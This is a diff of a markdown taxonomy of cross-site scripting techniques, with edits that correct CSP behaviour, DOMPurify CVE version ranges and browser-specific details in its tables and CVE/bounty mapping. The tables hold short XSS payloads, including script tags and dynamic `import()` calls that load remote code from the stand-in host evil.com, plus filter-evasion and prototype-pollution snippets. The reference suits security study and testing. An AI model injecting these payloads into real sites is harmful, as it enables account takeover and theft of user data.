@@ -51,7 +51,7 @@ The most straightforward vector: injecting a `<script>` element that the browser
 |---|---|---|
 | **Inline script block** | `<script>alert(1)</script>` inserted into page body | No tag filtering; CSP allows `unsafe-inline` or no CSP |
 | **External script load** | `<script src="https://evil.com/x.js"></script>` loads remote payload | CSP allows the attacker's domain or uses wildcard `*` |
-| **Module import** | `<script type="module">import('https://evil.com/x.js')</script>` | CSP does not restrict module imports; dynamic `import()` bypasses some CSP |
+| **Module import** | `<script type="module">import('https://evil.com/x.js')</script>` | CSP `script-src` governs module scripts and `import()` per spec; however, some legacy CSP implementations or misconfigured `script-src-elem` / `script-src` may fail to block dynamically constructed `import()` calls |
 | **Nonce-reuse injection** | Script tag injected with a guessed or leaked CSP nonce | Nonce is static, predictable, or leaked via CSS attribute selectors |
 | **Script via XSLT** | `<xsl:script>` or `<msxsl:script>` in XML-processed contexts | Application processes user input as XML/XSLT |
 
@@ -129,7 +129,7 @@ Achieving XSS from seemingly unexploitable injection points.
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
 | **accesskey + onclick on hidden input** | `<input type=hidden accesskey=x onclick=alert(1)>` triggered via Alt+Shift+X | Requires user to press specific key combination (Firefox) |
-| **meta tag CSP injection** | Injecting `<meta http-equiv="Content-Security-Policy" content="...">` to weaken CSP | Input reflected before existing CSP meta tag |
+| **meta tag CSP injection** | Injecting `<meta http-equiv="Content-Security-Policy" content="...">` adds an additional CSP policy. Per spec, multiple CSPs are intersected — an additional policy can only make the effective policy **more restrictive**, never weaker. The attack vector is using an injected restrictive policy to block legitimate scripts (DoS/defacement) or to create a `report-uri` exfiltration channel, not to loosen existing protections | Input reflected before or alongside existing CSP |
 
 ---
 
@@ -221,7 +221,7 @@ Exploiting server-side or client-side redirects to deliver XSS payloads.
 | **Meta refresh redirect** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Input controls meta refresh URL |
 | **DOM-based redirect** | `location.href = userInput` or `window.open(userInput)` | Client-side redirect with unsanitized input |
 | **OAuth fragment leak** | Redirect preserves `#access_token=...` across 302, readable via `location.hash` | OAuth implicit flow combined with open redirect |
-| **302 response body rendering (Firefox)** | Firefox renders the HTML response body of 302 redirect responses when `Content-Type: text/html` is set, instead of silently following the `Location` header. XSS payloads in the redirect response body execute in the redirecting origin's context — a browser-specific behavior other browsers suppress by discarding redirect bodies | Firefox browser; 302 response includes HTML body with attacker-controlled content; `Content-Type: text/html` on redirect response |
+| **302 response body rendering (Firefox-specific)** | Standard browser behavior discards 302 redirect response bodies (PortSwigger: "ordinarily not displayed"). However, Firefox renders the HTML body of a 302 response when the `Location` header contains a scheme Firefox does not follow as a redirect — specifically `ws://`, `wss://`, or `resource://` (Gremwell research). Combined with header injection (`%0A` in a reflected parameter), an attacker can inject a non-redirectable scheme into `Location` and place an XSS payload in the response body, which Firefox then renders. Chrome and IE are not affected by this technique | Firefox browser; CRLF/header injection allowing `Location` header manipulation to non-HTTP scheme (`ws://`, `wss://`); 302 response includes HTML body with attacker-controlled content |
 
 ---
 
@@ -264,7 +264,7 @@ Polluting JavaScript object prototypes to inject values that reach XSS sinks.
 | **Polluted innerHTML gadget** | `Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'` consumed by code reading undefined property | Merge/clone operation with attacker-controlled deep keys |
 | **Polluted src/href gadget** | `Object.prototype.src = 'javascript:alert(1)'` used by script/link loading code | Library reads `.src` from config without explicit assignment |
 | **Polluted transport_url** | Google Analytics `transport_url` property polluted to access `script.src` sink | GA loaded with default config; prototype pollution source exists |
-| **Sanitizer initialization bypass** | `Object.prototype.after` polluted before DOMPurify init (CVE-2024-45801) | Prototype pollution occurs before sanitizer loads |
+| **Sanitizer depth check bypass** | Prototype pollution weakens DOMPurify's nesting depth check, enabling nesting-based mXSS (CVE-2024-45801; DOMPurify < 2.5.4 and >= 3.0.0, < 3.1.3) | Prototype pollution occurs before or during sanitization; allows attacker to bypass depth limit and trigger node flattening mXSS |
 | **Template engine gadgets** | Polluted properties consumed by Handlebars, Pug, or EJS template compilation | Server-side rendering with prototype pollution |
 | **Implicit toString/valueOf gadget chain** | Prototype pollution sets `Object.prototype.toString` or `Object.prototype.valueOf` to return attacker-controlled strings. When polluted objects undergo implicit type coercion (string concatenation, comparison, template literal embedding), the overridden method injects executable content into sinks like `innerHTML` or `document.write` | Implicit type coercion on polluted object reaching a DOM write sink; no explicit property access required |
 
@@ -293,7 +293,7 @@ Payloads that are safe when parsed by the sanitizer but become dangerous after t
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
-| **Node flattening** | Deeply nested elements exceed browser's nesting limit; browser removes inner wrappers, exposing payload | DOMPurify ≤ 3.1.0 (2024 bypass); depth threshold varies by browser |
+| **Node flattening** | Deeply nested elements exceed browser's nesting limit; browser removes inner wrappers, exposing payload | DOMPurify < 2.5.0 and >= 3.0.0, < 3.1.3 (CVE-2024-47875); depth threshold varies by browser |
 | **Namespace confusion** | MathML/SVG namespace causes element to be parsed differently than sanitizer expects | `<math><mtext><table><mglyph><style>` triggers foreign-content parsing rules |
 | **Comment node mutation** | Sanitizer checks text nodes but ignores comments; browser converts comment content into active DOM after mutation | Comment containing encoded entity within math/SVG context |
 | **Stack of open elements** | Browser's "adoption agency algorithm" restructures nesting in ways sanitizer cannot predict | Misnested formatting elements (`<b>`, `<i>`, `<a>`) cause tree reconstruction |
@@ -359,7 +359,7 @@ Systematic methods to bypass input validation, output encoding, and Web Applicat
 | **Unicode escapes in JS** | `\u0061lert(1)` — JS interprets Unicode escapes in identifiers | Filter does not decode JS Unicode escapes |
 | **Computed property access** | `window['alert'](1)`, `self['al'+'ert'](1)` | Bracket notation bypasses static keyword detection |
 | **with statement** | `with(document)body.appendChild(createElement('script')).src='//evil.com'` | Avoids direct property references |
-| **import() expression** | `import('https://evil.com/x.js')` — dynamic import in modern browsers | CSP may not block dynamic imports; avoids eval |
+| **import() expression** | `import('https://evil.com/x.js')` — dynamic import in modern browsers | CSP `script-src` applies to `import()` per spec, but avoids `eval` keyword detection; useful when WAF/filter blocks `eval`/`Function` but not `import()` syntax |
 | **top-level await** | `await import('//evil.com/x.js')` in module context | Module context available |
 
 ### §8-3. HTTP Parameter Pollution (HPP)
@@ -505,7 +505,7 @@ Blind XSS payloads typically use `import()` or external script loading with out-
 
 | Subtype | Mechanism | Key Condition |
 |---|---|---|
-| **Credentialless iframe + login CSRF** | Self-XSS (where a user can only inject scripts into their own session) is escalated to a full attack: the attacker embeds the target application in a `credentialless` iframe (which loads the page without cookies, making it unauthenticated), then performs a login CSRF to authenticate the iframe as the attacker's account (where the self-XSS payload is stored). The payload executes in the victim's browser within the target's origin, gaining access to the victim's cookies and same-origin storage via DOM APIs | Self-XSS vulnerability; login endpoint lacks CSRF protection; target permits framing (no `X-Frame-Options` or permissive `frame-ancestors`); browser supports `credentialless` iframe attribute |
+| **Credentialless iframe + login CSRF** | Self-XSS escalation: the attacker embeds the target in a `credentialless` iframe (which loads the page in a separate ephemeral context without the victim's cookies or storage), then performs a login CSRF to authenticate the iframe as the attacker's account (where the self-XSS payload is stored). The payload executes in the victim's browser but within the iframe's ephemeral origin context — it does **not** directly access the victim's cookies or same-origin storage. Escalation to the victim's authenticated context requires additional steps (e.g., window reference manipulation, navigation, or postMessage relay to the parent frame) | Self-XSS vulnerability; login endpoint lacks CSRF protection; target permits framing (no `X-Frame-Options` or permissive `frame-ancestors`); browser supports `credentialless` iframe attribute |
 | **Window reference escalation** | After self-XSS fires in a credentialless iframe authenticated as the attacker, the injected script obtains references to the parent page's authenticated context via `window.open()` or top-level navigation, escalating from attacker-session XSS to victim-session compromise | Self-XSS in credentialless frame + ability to navigate or open windows in the target origin |
 | **SSO gadget chain (OAuth/OIDC flow)** | OAuth/OIDC authorization flows create cross-origin navigation chains (RP → IdP → RP) that carry attacker-influenceable state through URL parameters (`state`, `redirect_uri`, `login_hint`). The attacker crafts an authorization URL that routes the victim through IdP authentication and back to a RP page where stored self-XSS payload executes — in the victim's post-authentication context. Unlike credentialless iframe escalation, this uses the victim's own authentication rather than forcing the attacker's session | Self-XSS on a page reachable from the OAuth callback flow; OAuth flow preserves navigation to the vulnerable page (see `oauth.md` §10-4) |
 | **Token endpoint callback injection** | In implicit or hybrid OAuth flows, the authorization response parameters (code, token, error, state) are processed by client-side JavaScript on the callback page. If this processing has an injection flaw, the attacker crafts a forged authorization response URL with malicious values that trigger XSS when the callback handler evaluates them — escalating a parameter injection to full XSS in the authenticated context | Client-side OAuth callback processing with insufficient sanitization; implicit or hybrid flow (see `oauth.md` §10-4) |
@@ -531,13 +531,13 @@ Blind XSS payloads typically use `import()` or external script loading with out-
 
 ---
 
-## CVE / Bounty Mapping (2024–2025)
+## CVE / Bounty Mapping (Notable Cases)
 
 | Mutation Combination | CVE / Case | Impact / Bounty |
 |---|---|---|
-| §7-1 (Node flattening mXSS) | CVE-2024-47875 (DOMPurify < 3.1.3) | DOMPurify sanitization bypass; arbitrary JS execution in all dependent apps |
+| §7-1 (Node flattening mXSS) | CVE-2024-47875 (DOMPurify < 2.5.0 and >= 3.0.0, < 3.1.3) | DOMPurify sanitization bypass; arbitrary JS execution in all dependent apps |
 | §7-1 (Regex sanitizer bypass) | CVE-2025-26791 (DOMPurify < 3.2.4) | mXSS via incorrect template literal regex in `SAFE_FOR_TEMPLATES` mode |
-| §6-2 (Prototype pollution → sanitizer) | CVE-2024-45801 (DOMPurify ≤ 3.0.8) | Prototype pollution of `Node.prototype.after` bypasses Trusted Types |
+| §6-2 (Prototype pollution → sanitizer depth check) | CVE-2024-45801 (DOMPurify < 2.5.4 and >= 3.0.0, < 3.1.3) | Prototype pollution weakens nesting depth check, enabling nesting-based mXSS |
 | §6-1 (DOM clobbering → script load) | CVE-2024-43788 (Webpack) | DOM clobbering in `AutoPublicPathRuntimeModule` leads to XSS |
 | §6-1 (DOM clobbering → router) | CVE-2024-47885 (Astro) | DOM clobbering in client-side router enables stored XSS |
 | §6-1 (DOM clobbering → bundler) | CVE-2024-47068 (Rollup) | `import.meta.url` clobbering in bundled scripts; npm supply chain impact |
@@ -545,15 +545,15 @@ Blind XSS payloads typically use `import()` or external script loading with out-
 | §9-2 (Markdown to JSX) | CVE-2024-21535 (markdown-to-jsx) | XSS via malicious iframe in markdown `src` property |
 | §2-3 (Stored XSS in PAN-OS) | CVE-2024-5920 (Palo Alto PAN-OS) | Admin impersonation via stored XSS pushed from Panorama |
 | §10-1 (CRLF to XSS) | CVE-2024-52875 (GFI KerioControl) | CRLF injection in `dest` parameter; 1-click RCE chain |
-| §6-3 (postMessage to XSS) | CVE-2024-49038 (Microsoft Copilot Studio) | CVSS 9.3; missing origin validation enables token theft |
+| §6-3 (postMessage to XSS) | CVE-2024-49038 (Microsoft Copilot Studio) | CVSS 9.3; XSS / Elevation of Privilege per NVD. MSRC describes postMessage-based root cause; official classification is broader than token theft alone |
 | §9-1 (Vue template XSS) | CVE-2024-6783 (vue-template-compiler) | Prototype pollution enables XSS in Vue 2.x template compiler |
 | §6-3 (postMessage chain) | ZoomInfo Chat (July 2024) | Two-stage: token leakage via `postMessage('*')` + DOM XSS |
-| §6-3 (postMessage ATO) | Meta Conversion API Gateway (Jan 2025) | Zero-click account takeover via unvalidated postMessage origin. $12,500 bounty |
+| §6-3 (postMessage ATO) | Meta Conversion API Gateway (Jan 2026, personal blog report) | Account takeover via unvalidated postMessage origin. $12,500 bounty. Source: individual researcher blog post — details not independently confirmed by Meta advisory |
 | §10-2 (Cookie sandwich) | Apache Tomcat (2025 research) | HttpOnly cookie theft via RFC2109 parsing switch; phantom `$Version` cookie |
 | §8-3 (Parameter pollution) | WAF bypass research (2024) | 14 of 17 major WAF configurations bypassed (AWS, GCP, Azure, Cloudflare) |
 | §9-1 (Expression sandbox escape) | CVE-2025-59840 (Vega) | Expression sandbox bypass via implicit toString gadget chain; arbitrary JS execution |
-| §10-3 (QR code injection context) | CVE-2019-17003 (Firefox QR reader) | XSS via malicious QR code scanned by Firefox's built-in reader; script execution in privileged browser context |
-| §10-3 (Embedded application sandbox escape) | CVE-2024-32472 (Excalidraw) | Sandbox escape via `gist.github` iframe embedding; arbitrary JavaScript execution in drawing application |
+| §10-3 (QR code injection context) | CVE-2019-17003 (Firefox for iOS QR reader) | XSS via malicious QR code scanned by Firefox for iOS's QR scanner; script execution in the app's web view context |
+| §10-3 (Embedded application sandbox escape) | CVE-2024-32472 (Excalidraw) | Web embeddable component: iframe `srcdoc` HTML injection + attribute injection + `allow-same-origin` sandbox combination enables arbitrary JavaScript execution in the embedding application's origin |
 | §7-1 (Element rename/unrename bypass) | Skiff/Proton Mail XSS (SonarSource, 2023) | Email client sanitizer bypass; arbitrary JavaScript execution in victim's mailbox via crafted email |
 
 ---
